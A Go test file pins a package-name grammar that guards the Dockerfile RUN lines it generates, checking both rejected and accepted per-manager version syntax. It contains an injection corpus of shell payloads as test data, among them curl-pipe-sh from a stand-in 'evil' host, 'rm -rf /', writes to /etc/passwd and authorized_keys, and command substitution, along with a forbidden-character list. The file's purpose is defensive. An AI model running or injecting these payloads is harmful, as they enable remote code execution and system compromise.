package imagespec

import (
	"regexp"
	"strings"
	"testing"
)

// ─────────────────────────────────────────────────────────────────────────────
// GAP-148: the token grammar is the security boundary — these tests pin it.
//
// The board row's requirement, verbatim: the shared grammar excludes shell
// metacharacters because Dockerfile() renders each package into a RUN line a
// SHELL parses. GAP-148 adds single-quoting plus per-manager version syntax;
// WHITESPACE, ; & | $ ` \ ' " and NEWLINES must stay rejected for EVERY
// manager, and a table-driven injection corpus must be rejected under every
// manager.
// ─────────────────────────────────────────────────────────────────────────────

// dangerousSet is the forbid-forever list from the task, spelled out here so a
// future edit that drops a byte from tokenDangerous fails this test rather than
// silently widening the grammar.
var dangerousSet = []string{" ", "\t", "\r", "\n", ";", "&", "|", "$", "`", `\`, "'", `"`}

// dangerousSetLiteral is the same set as the single string tokenDangerous holds.
const dangerousSetLiteral = " \t\r\n;&|$`\\'\""

// TestTokenGrammar_DangerousSetIsExactlyTheRequiredOne pins the constant itself.
func TestTokenGrammar_DangerousSetIsExactlyTheRequiredOne(t *testing.T) {
	if tokenDangerous != dangerousSetLiteral {
		t.Fatalf("tokenDangerous = %q, want %q — the forbidden set is a security contract, not a tuning knob",
			tokenDangerous, dangerousSetLiteral)
	}
	// The single quote's presence is what makes the renderers' quoting
	// unescapable: a token can never close the quote it is wrapped in.
	if !strings.Contains(tokenDangerous, "'") {
		t.Fatal("tokenDangerous must contain ' — without it the single-quoting in the renderers is escapable")
	}
}

// injectionCorpus is the table-driven attack set. Every payload must be
// REJECTED by EVERY registered manager. Payloads are what an attacker would
// try to put in a "package name" to escape the RUN line and run their own
// command (curl|sh and friends) or to read/write the filesystem.
var injectionCorpus = []struct {
	name    string
	payload string
}{
	{"curl pipe sh", "curl|sh"},
	{"pipe chain", "jq|sh"},
	{"semicolon chaining", "jq; rm -rf /"},
	{"semicolon no space", "jq;id"},
	{"and-and chaining", "jq && curl http://evil"},
	{"or-or chaining", "jq || sh"},
	{"background ampersand", "jq&"},
	{"newline escape into RUN", "jq\nRUN curl evil|sh"},
	{"carriage return escape", "jq\rRUN curl evil|sh"},
	{"tab separator", "jq\tcurl"},
	{"space separated second command", "jq curl"},
	{"redirection to /etc/passwd", "x>/etc/passwd"},
	{"redirection without space", "jq>/etc/passwd"},
	{"input redirection from /etc/shadow", "jq</etc/shadow"},
	{"append redirection", "jq>>/root/.ssh/authorized_keys"},
	{"backtick substitution", "jq`id`"},
	{"dollar command substitution", "jq$(id)"},
	{"dollar variable expansion", "jq$HOME"},
	{"embedded single quote", "jq'"},
	{"embedded single quote closing the renderer quote", "requests>=2.31,<3' || curl evil|sh"},
	{"embedded double quote", `jq"`},
	{"backslash escape", `jq\`},
	{"glob wildcard star", "typescript*"},
	{"glob question mark", "typescript?"},
	{"brace expansion", "jq{curl,sh}"},
	{"comment truncation", "jq # curl evil"},
	{"history expansion chained onto a separator", "jq;!curl"},
	{"named pipe", "jq>(sh)"},
}

// TestTokenGrammar_EmptyTokenRejectedByEveryManager covers the one corpus entry
// that is a BOUNDS rule rather than a grammar rule: Probe is the character
// policy alone, so emptiness is enforced by validateToken (which every wire
// path goes through). Asserting both here keeps the coverage explicit instead
// of implying the grammar catches it.
func TestTokenGrammar_EmptyTokenRejectedByEveryManager(t *testing.T) {
	for i := range managerDefs {
		def := &managerDefs[i]
		if err := validateToken(def.Name, ""); err == nil {
			t.Errorf("validateToken(%q, \"\") accepted an empty token", def.Name)
		}
	}
}

// TestTokenGrammar_InjectionCorpusRejectedByEveryManager is the acceptance
// evidence for criterion 4: the corpus is refused by every manager, including
// the rows that declare extra version-syntax characters (a row's TokenExtra
// must never re-admit a payload).
func TestTokenGrammar_InjectionCorpusRejectedByEveryManager(t *testing.T) {
	for i := range managerDefs {
		def := &managerDefs[i]
		for _, tc := range injectionCorpus {
			// validateToken is the real entry point (it delegates to the
			// row's Probe and adds the shared bounds), so the corpus is
			// driven through what the parser actually calls.
			if err := validateToken(def.Name, tc.payload); err == nil {
				t.Errorf("manager %q accepted injection payload %q (%s)", def.Name, tc.payload, tc.name)
			}
			if err := def.Probe(tc.payload); err == nil {
				t.Errorf("manager %q Probe accepted injection payload %q (%s)", def.Name, tc.payload, tc.name)
			}
		}
	}
}

// TestTokenGrammar_DangerousSetRejectedForEveryManagerGeneric is the generic
// guard demanded by criterion 3: it loops over managerDefs (not a hand-list), so
// a manager row added later inherits the coverage automatically and a row that
// widens the grammar fails here.
func TestTokenGrammar_DangerousSetRejectedForEveryManagerGeneric(t *testing.T) {
	if len(managerDefs) == 0 {
		t.Fatal("registry is empty — the generic dangerous-set guard would be vacuous")
	}
	for i := range managerDefs {
		def := &managerDefs[i]
		for _, c := range dangerousSet {
			for _, shape := range []string{"jq" + c, c + "jq", "jq" + c + "curl", c} {
				if err := def.Probe(shape); err == nil {
					t.Errorf("manager %q accepted dangerous byte %q in %q", def.Name, c, shape)
				}
			}
		}
	}
}

// TestTokenGrammar_DangerousSetCannotBeReAdmittedByARow proves the guard lives
// BELOW the per-row policy: even when a row declares a forbidden byte in
// TokenExtra, the dangerous set still wins. This is the "a future row cannot
// accidentally widen it" requirement, tested rather than asserted.
func TestTokenGrammar_DangerousSetCannotBeReAdmittedByARow(t *testing.T) {
	for _, c := range dangerousSet {
		rogue := tokenPolicy("rogue", c, nil...)
		if err := rogue("jq" + c + "curl"); err == nil {
			t.Errorf("a row declaring TokenExtra %q re-admitted %q", c, c)
		}
	}
	// The whole dangerous set at once, as a maximal rogue row.
	rogue := tokenPolicy("rogue", tokenDangerous, nil...)
	for _, c := range dangerousSet {
		if err := rogue("x" + c + "y"); err == nil {
			t.Errorf("maximal rogue row re-admitted %q", c)
		}
	}
}

// TestRegister_RefusesDangerousTokenExtra proves register refuses such a row
// outright, so it can never even be indexed.
func TestRegister_RefusesDangerousTokenExtra(t *testing.T) {
	for _, c := range dangerousSet {
		def := ManagerDef{
			Name:       PackageManager("rogue-" + strings.TrimSpace(strings.ReplaceAll(c, "\n", "nl"))),
			TokenExtra: c,
			Render:     func(_ *strings.Builder, _ []string) {},
		}
		msg := func() (msg string) {
			defer func() {
				if r := recover(); r != nil {
					msg = r.(string)
				}
			}()
			register(&def)
			return ""
		}()
		if msg == "" {
			t.Errorf("register accepted TokenExtra %q", c)
			continue
		}
		if !strings.Contains(msg, "dangerous token character") {
			t.Errorf("register panic for %q does not explain the refusal: %q", c, msg)
		}
	}
}

// TestTokenGrammar_RedirectionShapeRejectedForEveryManager pins the comparator
// rule: a row that declares `<`/`>` admits them only where they open a version
// constraint, so a redirection is refused outright rather than merely defanged
// by the quoting. Rows that declare no comparator (apt, go, npm) refuse both
// characters everywhere.
func TestTokenGrammar_RedirectionShapeRejectedForEveryManager(t *testing.T) {
	bad := []string{
		"x>/etc/passwd", "x</etc/shadow", "x>>/etc/passwd", "x>", "jq>-", "pkg>+",
		"pkg>1>2", "pkg<>x", "pkg>=", "pkg>>x", "pkg>/tmp/x", "pkg</tmp/x",
	}
	for i := range managerDefs {
		def := &managerDefs[i]
		for _, tok := range bad {
			if err := def.Probe(tok); err == nil {
				t.Errorf("manager %q accepted redirection-shaped token %q", def.Name, tok)
			}
		}
		// A row that declares the comparators must still accept the real
		// version forms; a row that declares none must refuse even those
		// (apt/go/npm's accepted set is frozen — criterion 6).
		comparatorRows := strings.ContainsAny(def.TokenExtra, "<>")
		for _, tok := range []string{"pkg>=1", "pkg<=1", "pkg>1.2", "pkg<1.2", "pkg>=1.2.3,<2"} {
			err := def.Probe(tok)
			if comparatorRows && err != nil {
				t.Errorf("manager %q rejected version comparator %q: %v", def.Name, tok, err)
			}
			if !comparatorRows && err == nil {
				t.Errorf("manager %q accepted comparator token %q although it declares no comparator grammar", def.Name, tok)
			}
		}
	}
}

// frozenManagersAccepted is criterion 6: the accepted set of the three
// pre-existing managers, captured from the shipped grammar. Not one entry may
// be lost — GAP-148 adds quoting and new managers, it never loosens (or
// silently tightens) apt/go/npm.
var frozenManagersAccepted = map[PackageManager][]string{
	ManagerAPT: {
		"jq", "curl", "curl=8.5.0-2ubuntu10", "libssl3=3.0.13-0ubuntu3",
		"python3-pip", "golang-go", "ca-certificates", "build-essential",
		"linux-image-6.8.0-45-generic", "nodejs_18_1", "pkg:any",
	},
	ManagerGo: {
		"golang.org/x/tools/gopls@v0.17.0", "honnef.co/go/tools/cmd/staticcheck@v0.5.1",
		"github.com/go-delve/delve/cmd/dlv@latest", "gopls", "mvdan.cc/gofumpt@v0.6.0",
	},
	ManagerNPM: {
		"typescript@5.6.3", "@types/node@20.14.0", "npm", "pnpm@9.1.0",
		"@angular/cli@17.3.0", "eslint@9.0.0-beta.1",
	},
}

// frozenManagersRejected is criterion 6's other half: tokens these managers
// refused before still fail. The `<`/`>` rows are the one deliberate
// NARROWING: apt, go and npm declare no comparator grammar, so a comparator
// token is no longer accepted for them (the old shared class admitted it, which
// is what let `x>/etc/passwd` reach a validator at all).
var frozenManagersRejected = map[PackageManager][]string{
	ManagerAPT: {"jq;id", "curl|sh", "/var/run/docker.sock", "--mount=type=bind,source=/etc,target=/etc", "a/b", "jq curl", "jq\nRUN x", "jq'", "x>/etc/passwd"},
	ManagerGo:  {"jq;id", "pkg@*", "pkg>1", "a b", "pkg^1", "jq`id`"},
	ManagerNPM: {"jq;id", "typescript*", "pkg>=1", "a,b", "pkg~1", "jq$(id)"},
}

// TestTokenGrammar_FrozenManagerSetsUnchanged asserts criterion 6 directly.
func TestTokenGrammar_FrozenManagerSetsUnchanged(t *testing.T) {
	for _, m := range []PackageManager{ManagerAPT, ManagerGo, ManagerNPM} {
		def := m.Def()
		if def == nil {
			t.Fatalf("manager %q is not registered", m)
		}
		for _, tok := range frozenManagersAccepted[m] {
			if err := def.Probe(tok); err != nil {
				t.Errorf("frozen accepted token %q for %q now rejected: %v", tok, m, err)
			}
		}
		for _, tok := range frozenManagersRejected[m] {
			if err := def.Probe(tok); err == nil {
				t.Errorf("frozen rejected token %q for %q now accepted", tok, m)
			}
		}
		// The frozen rows must not have acquired version-grammar extras.
		if def.TokenExtra != "" {
			t.Errorf("manager %q gained TokenExtra %q — apt/go/npm's grammar is frozen", m, def.TokenExtra)
		}
	}
}

// TestTokenGrammar_TokenReMirrorsSharedClass makes the documented regex
// load-bearing: for every byte value, the shared class (an empty TokenExtra and
// no TokenDeny) accepts exactly what tokenRe matches. A future edit to either
// side that diverges fails here, and no byte can be smuggled into the shared
// class unnoticed.
func TestTokenGrammar_TokenReMirrorsSharedClass(t *testing.T) {
	re := regexp.MustCompile(tokenRe)
	probe := tokenPolicy("shared", "", nil...)
	for b := 0; b < 256; b++ {
		tok := string([]byte{byte(b)})
		got := probe(tok) == nil
		want := re.MatchString(tok)
		if got != want {
			t.Errorf("byte %#02x: tokenPolicy accepts=%v, tokenRe matches=%v", b, got, want)
		}
	}
	// Non-ASCII bytes beyond a single byte are also refused.
	for _, tok := range []string{"jqé", "jq\x80", "日本語"} {
		if probe(tok) == nil {
			t.Errorf("shared class accepted non-ASCII token %q", tok)
		}
	}
}

// TestTokenGrammar_ExtrasAreOnlyVersionGrammarCharacters pins each row's
// TokenExtra as registry data (criterion 2): a manager declares ONLY the extra
// characters its own grammar needs, and nothing in the dangerous set.
func TestTokenGrammar_ExtrasAreOnlyVersionGrammarCharacters(t *testing.T) {
	want := map[PackageManager]string{
		ManagerAPT:      "",
		ManagerGo:       "",
		ManagerNPM:      "",
		ManagerPip:      ",<>[]!~",
		ManagerPipx:     ",<>[]!~",
		ManagerCargo:    ",<>^~",
		ManagerGem:      ",<>~!",
		ManagerComposer: ",<>^~!",
	}
	for i := range managerDefs {
		def := &managerDefs[i]
		exp, ok := want[def.Name]
		if !ok {
			t.Errorf("manager %q has no pinned TokenExtra expectation — add one (and its real version syntax) to this table", def.Name)
			continue
		}
		if def.TokenExtra != exp {
			t.Errorf("manager %q TokenExtra = %q, want %q", def.Name, def.TokenExtra, exp)
		}
		for j := 0; j < len(def.TokenExtra); j++ {
			if dangerousByte(def.TokenExtra[j]) {
				t.Errorf("manager %q declares dangerous byte %q in TokenExtra", def.Name, string(def.TokenExtra[j]))
			}
		}
	}
	if len(want) != len(managerDefs) {
		t.Errorf("pinned TokenExtra table has %d entries, registry has %d managers", len(want), len(managerDefs))
	}
}

// realVersionSyntax is the positive corpus (criterion 5): one entry per
// registered manager holding the version syntax that manager really accepts,
// verifiable against the manager's own documentation. A new manager must add
// its entry here — the test fails if a row has none — so new syntax can never
// ship untested.
var realVersionSyntax = map[PackageManager][]string{
	ManagerAPT: {"jq", "curl=8.5.0-2ubuntu10", "libssl3=3.0.13-0ubuntu3"},
	ManagerGo:  {"golang.org/x/tools/gopls@v0.17.0", "honnef.co/go/tools/cmd/staticcheck@latest"},
	ManagerNPM: {"typescript@5.6.3", "@types/node@20.14.0", "npm"},
	ManagerPip: {"requests>=2.31,<3", "flask[async]", "requests[foo]>=2.31,<3", "tox~=4.0", "django!=5.0"},
	// pipx installs PyPI applications into isolated venvs and inherits pip's
	// requirement grammar for them (PEP 440 specifiers, comma AND, [extras]).
	ManagerPipx:     {"black>=24.0,<25", "ruff~=0.6", "poetry[all]", "pipdeptree==2.23.1", "httpie!=3.2.0"},
	ManagerCargo:    {"ripgrep@^14.1", "cargo-edit@~0.12", "hyperfine@>=1.18,<2", "bat"},
	ManagerGem:      {"rake@~>13.0", "rails@>=7,<8", "rubocop@!=1.5.0", "puma"},
	ManagerComposer: {"symfony/console:^7.0", "phpunit/phpunit:~10.5", "monolog/monolog:>=3.0,<4.0", "laravel/pint"},
}

// TestTokenGrammar_Accept_RealVersionSyntaxPerManager is criterion 5: every
// manager expresses its own REAL version syntax, through both the Probe and the
// real parse entry point.
func TestTokenGrammar_Accept_RealVersionSyntaxPerManager(t *testing.T) {
	for i := range managerDefs {
		def := &managerDefs[i]
		toks, ok := realVersionSyntax[def.Name]
		if !ok {
			t.Errorf("manager %q has no real-version-syntax corpus — add one so its accepted grammar is proven", def.Name)
			continue
		}
		if len(toks) == 0 {
			t.Errorf("manager %q has an empty real-version-syntax corpus", def.Name)
		}
		for _, tok := range toks {
			if err := def.Probe(tok); err != nil {
				t.Errorf("manager %q rejected its own version syntax %q: %v", def.Name, tok, err)
			}
			if err := validateToken(def.Name, tok); err != nil {
				t.Errorf("validateToken(%q, %q) = %v, want nil", def.Name, tok, err)
			}
			// The same token must survive the real wire path: a directive
			// with it parses and keeps the token verbatim.
			raw := `{"packages": [{"manager": "` + string(def.Name) + `", "packages": [` + jsonString(tok) + `]}]}`
			spec, err := Parse([]byte(raw))
			if err != nil {
				t.Errorf("Parse rejected %s token %q: %v", def.Name, tok, err)
				continue
			}
			if len(spec.Packages) != 1 || len(spec.Packages[0].Packages) != 1 || spec.Packages[0].Packages[0] != tok {
				t.Errorf("Parse mangled %s token %q: %+v", def.Name, tok, spec.Packages)
			}
		}
	}
}

// TestTokenGrammar_Reject_UnsupportedSyntaxPerManager is the mirror of the
// positive corpus: syntax that belongs to ANOTHER manager (and every glob) is
// refused, so a row's declared extras stay as narrow as its own grammar.
func TestTokenGrammar_Reject_UnsupportedSyntaxPerManager(t *testing.T) {
	cases := []struct {
		mgr PackageManager
		tok string
		why string
	}{
		{ManagerAPT, "requests>=2.31,<3", "apt has no PEP 440 specifiers"},
		{ManagerAPT, "jq*", "apt has no version globs here"},
		{ManagerGo, "ripgrep@^14.1", "cargo requirement syntax"},
		{ManagerGo, "typescript*", "glob"},
		{ManagerNPM, "flake8[async]", "pip extras"},
		{ManagerNPM, "jq;id", "chaining"},
		{ManagerPip, "symfony/console:^7.0", "composer constraint"},
		{ManagerPip, "jq*", "pip wildcards stay refused (glob shape)"},
		// pipx inherits pip's grammar exactly: the same foreign syntax and
		// the same wildcard refusal apply.
		{ManagerPipx, "symfony/console:^7.0", "composer constraint"},
		{ManagerPipx, "jq*", "pipx wildcards stay refused (glob shape)"},
		{ManagerCargo, "requests[foo]", "extras belong to pip"},
		{ManagerCargo, "ripgrep@*", "cargo wildcard stays refused (glob shape)"},
		{ManagerGem, "jq{curl,sh}", "brace expansion"},
		{ManagerComposer, "monolog/monolog:*", "composer wildcard stays refused (glob shape)"},
		{ManagerComposer, "vendor/package:dev-main#abcdef", "composer commit reference (# refused)"},
	}
	for _, tc := range cases {
		def := tc.mgr.Def()
		if def == nil {
			t.Errorf("manager %q is not registered", tc.mgr)
			continue
		}
		if err := def.Probe(tc.tok); err == nil {
			t.Errorf("manager %q accepted %q (%s)", tc.mgr, tc.tok, tc.why)
		}
	}
}

// TestTokenGrammar_ErrorNamesTheManagerAndCharacter keeps rejections
// attributable: the message says which manager and which character, so an
// operator can act on it (the pre-587 behaviour named neither consistently).
func TestTokenGrammar_ErrorNamesTheManagerAndCharacter(t *testing.T) {
	for i := range managerDefs {
		def := &managerDefs[i]
		err := def.Probe("jq;id")
		if err == nil {
			t.Fatalf("manager %q accepted ; ", def.Name)
		}
		msg := err.Error()
		if !strings.Contains(msg, string(def.Name)) {
			t.Errorf("manager %q rejection %q does not name the manager", def.Name, msg)
		}
		if !strings.Contains(msg, `";"`) {
			t.Errorf("manager %q rejection %q does not name the offending character", def.Name, msg)
		}
	}
}

// jsonString encodes s as a JSON string literal (the corpus contains quotes).
func jsonString(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for i := 0; i < len(s); i++ {
		switch c := s[i]; c {
		case '"', '\\':
			b.WriteByte('\\')
			b.WriteByte(c)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteByte(c)
		}
	}
	b.WriteByte('"')
	return b.String()
}
